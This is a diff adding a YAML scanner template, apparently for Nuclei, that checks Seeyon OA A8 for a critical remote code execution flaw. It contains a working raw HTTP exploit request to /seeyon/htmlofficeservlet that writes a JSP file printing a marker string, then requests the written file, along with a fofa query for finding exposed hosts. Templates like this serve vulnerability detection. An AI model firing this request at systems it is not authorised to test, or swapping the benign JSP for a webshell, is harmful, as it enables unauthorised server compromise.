@@ -1,0 +1,48 @@
+id: seeyon-oa-a8-htmlofficeservlet-rce
+
+info:
+  name: Seeyon OA A8 RCE
+  author: zp857
+  severity: critical
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,rce
+  metadata:
+    fofa-query: '"致远A8"'
+
+requests:
+  - raw:
+      - |
+        POST /seeyon/htmlofficeservlet HTTP/1.1
+        Host: {{Hostname}}
+
+        DBSTEP V3.0     347             0               100             DBSTEP=OKMLlKlV
+        OPTION=S3WYOSWLBSGr
+        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+        CREATEDATE=wUghPB3szB3Xwg66
+        RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+        originalFileId=wV66
+        originalCreateDate=wUghPB3szB3Xwg66
+        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdbHguzUo5nHzs
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLSGP4oEzLKAz4=iz=66
+        6e4f045d4b8506bf492ada7e3390d7ce<%
+        int x=857855+2;
+        out.println("\nzp" + x);
+        %>6e4f045d4b8506bf492ada7e3390d7ce
+
+      - |
+        GET /seeyon/zp862.jsp HTTP/1.1
+
+      - |
+        GET /seeyon/test123456.jsp HTTP/1.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "zp857857"
+          - ":-)"
